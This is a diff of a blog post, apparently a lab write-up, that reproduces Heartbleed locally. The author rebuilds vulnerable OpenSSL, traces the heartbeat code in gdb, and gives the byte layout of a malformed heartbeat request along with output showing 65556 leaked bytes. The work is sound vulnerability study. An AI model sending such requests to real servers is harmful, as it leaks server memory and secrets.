@@ -113,7 +113,7 @@ The changelog for *openssl_1.0.1e-2+deb7u14* is available
 On April the 7th, heartbleed bug was fixed and a patch was applied to the package
 incrementing the release to deb7u5.
 
-{% highlight console lineos %} 
+{% highlight console lineos %}
 openssl (1.0.1e-2+deb7u5) wheezy-security; urgency=high
 
   * Non-maintainer upload by the Security Team.
@@ -127,7 +127,7 @@ openssl (1.0.1e-2+deb7u5) wheezy-security; urgency=high
 {% endhighlight %} 
 
 The openssl version installed on my machine is therefore not vulnerable. In order to
-restore the bug, the package must be rebuilt avoiding the application of
+restore the bug, the package must be rebuilt without applying
 the patch. When the source deb file is downloaded, the patches are applied automatically.
 The easiest way to build a vulnerable package it to apply a reverse patch. The 
 following commands can be used.
@@ -209,8 +209,7 @@ nginx installation
 nginx can be configured to enable HTTPS connections by simply adding this entry
 in the configuration file, */etc/nginx/nginx.conf* by default.
 
-{% highlight console linenos %}
-
+{% highlight console %}
 server {
     listen              443 ssl;
     server_name         localhost;
@@ -221,7 +220,6 @@ server {
             index  index.html index.htm;
     }
 }
-
 {% endhighlight %}
 Heartbeat request
 =================
@@ -270,8 +268,9 @@ like instruction reordering, loop unrolling, inlining. The easiest way is to sim
 turn off optimizations. CFLAGS used by dpkg can be set in */etc/dpkg/buildflags.conf*.
 In this specific case, the following directive does the job.
 
+{% highlight console %}
 SET CFLAGS -g -O0 -fstack-protector --param=ssp-buffer-size=4 -Wformat -Werror=format-security  
-
+{% endhighlight %}
 After recompiling  libssl1.0.0, the debugging symbols should be embedded in the library,
 therefore the debug package *libssl1.0.0-dbg\_1.0.1e-2+deb7u14.\_i386* should
 not be necessary. A further simplification which makes the debugging easier is
@@ -283,6 +282,7 @@ in */etc/nginx/nginx.conf*, so that there is just one thread serving the request
 coming from the clients. nginx must be stopped and restarted and gdb can
 then be attached to the worker process.
 
+{% highlight console %}
 ➜  ~ [1] at 10:15:57 [Thu 12] $ ps aux | grep nginx
 root      5210  0.0  0.0  11980   960 ?        Ss   10:15   0:00 nginx: master process /usr/sbin/nginx
 www-data  5211  0.0  0.0  12144  1356 ?        S    10:15   0:00 nginx: worker process
@@ -298,32 +298,40 @@ This GDB was configured as "i486-linux-gnu".
 For bug reporting instructions, please see:
 <http://www.gnu.org/software/gdb/bugs/>.
 (gdb) attach 5211
-
+{% endhighlight %}
 
 gdb executes the ptrace system call and starts tracing nginx. It then tries to load the
 symbols of all the shared objects mapped in the address space of the process, including
 libssl.so.1.0.0. If gdb fails to load the symbols for libssl, then something went wrong.
 
+{% highlight console%}
 Reading symbols from /usr/lib/i386-linux-gnu/i686/cmov/libssl.so.1.0.0...done.
 Loaded symbols for /usr/lib/i386-linux-gnu/i686/cmov/libssl.so.1.0.0
+{% endhighlight %}
+
 
 gdb should also be pointed to the location of the source code with the *directory*
 command.
 
+{% highlight console%}
 (gdb) directory <path-of-the-sources-of-the-dpkg-package>/openssl-1.0.1e/ssl
 Source directories searched: <path-of-the-sources-of-the-dpkg-package>/openssl-1.0.1e/ssl:$cdir:$cwd
+{% endhighlight %}
 
 A breakpoint on *tls1\_process\_heartbeat* can be set and the execution resumed.
 
+{% highlight console%}
 (gdb) break tls1_process_heartbeat
 Breakpoint 1 at 0xb76c29d4: file t1_lib.c, line 2579.
 (gdb) c
 Continuing.
+{% endhighlight %}
 
 Now, upon receiving a heartbeat message, the code will hit the breakpoint, allowing
 step by step execution.
 
 
+{% highlight C linenos %}
 Breakpoint 1, tls1_process_heartbeat (s=0x9910a58) at t1_lib.c:2579
 2579        unsigned char *p = &s->s3->rrec.data[0], *pl;
 (gdb) s
@@ -336,6 +344,7 @@ Breakpoint 1, tls1_process_heartbeat (s=0x9910a58) at t1_lib.c:2579
 2587        pl = p;
 (gdb)
 
+{% endhighlight %}
 
 The control path which explains why a heartbeat response is not returned
 is not that trivial and without a proper knowledge of the
@@ -343,7 +352,7 @@ library it's difficult to fully grasp what the code does. After
 a series of *step* and *next*, the single step execution led to the function
 *buffer_write* in *bf_buff.c*. 
 
-{% highlight console linenos %}
+{% highlight C linenos %}
 Breakpoint 1, tls1_process_heartbeat (s=0x9910a58) at t1_lib.c:2579
 [...]
 2614            r = ssl3_write_bytes(s, TLS1_RT_HEARTBEAT, buffer, 3 + payload + padding);
@@ -466,16 +475,17 @@ the buffer through the socket is taken based on the size of the data with respec
 the size of the BIO buffer. If the former is smaller than the latter, the buffer is
 not flushed (line 14). The heartbeat response message here is 28 bytes and the buffer is 4KB,
 the data is written on the buffer but not flushed.
-
-    (gdb) print i
-    $1 = 4096
-    (gdb) print inl
-    $2 = 28
+{% highlight console %}
+(gdb) print i
+$1 = 4096
+(gdb) print inl
+$2 = 28
+{% endhighlight %}
 
 What happens if the size of the heartbeat message is bigger than the buffer, say 5000
 bytes? I used <a href="https://github.com/marcoguerri/heartbleed/blob/master/send_heartbeat.c" target="_blank"> heartbeat\_send.c</a> 
 to send a well-formed heartbeat request while tracing *buffer_write*.
-
+{% highlight C linenos %}
     (gdb) 
     247     i=b->method->bwrite(b,in,inl);
     (gdb) s
@@ -522,7 +532,7 @@ to send a well-formed heartbeat request while tracing *buffer_write*.
     249     if (i > 0) b->num_write+=(unsigned long)i;
     (gdb) print i
     $5 = 5000
- 
+ {% endhighlight  %}
 
 The loop at line 54 writes 5000 bytes in the output buffer, which is then flushed through 
 the socket; the client receives a well-formed heartbeat response with a payload
@@ -539,24 +549,28 @@ Heartbleed request
 A malformed hearbeat request features a payload size which does not match the actual
 lenght of the data carried inside the message.
 
-    0x18                    # Type: Heartbeat
-    0x03 0x02               # Protocol: TLS 1.1 (SSL v3.2) 
-    0x00 0x03               # Record length, size of the heartbeat message
-    0x01                    # heartbeat message type: request
-    0xFF 0xFF               # Payload size, does not match the actual size of the payload
-                            # No payload
+{% highlight console %}
+0x18                    # Type: Heartbeat
+0x03 0x02               # Protocol: TLS 1.1 (SSL v3.2) 
+0x00 0x03               # Record length, size of the heartbeat message
+0x01                    # heartbeat message type: request
+0xFF 0xFF               # Payload size, does not match the actual size of the payload
+                        # No payload
+{% endhighlight %}
 
 Due to the lack of checks on the payload size, the server returns 65536 bytes 
 copied from the address space of the process: <a href="https://github.com/marcoguerri/heartbleed/blob/master/send_heartbeat.c" target="_blank"> heartbeat\_send.c</a>
 can be adapted to send a malformed request. The heartbeat response message contains 65536 bytes 
 of payload, 16 bytes of padding and 4 bytes of header, 65556 in total.
 
-    ➜  ~/heartbleed [1] at 12:35:56 [Thu 12] $ ./send_heartbleed
-    Initializing new connection...
-    Connecting...
-    Connected!
-    resplen:  65556
 
+{% highlight console %}
+➜  ~/heartbleed [1] at 12:35:56 [Thu 12] $ ./send_heartbleed
+Initializing new connection...
+Connecting...
+Connected!
+resplen:  65556
+{% endhighlight %}
 
 Scanning leaked memory
 =============================
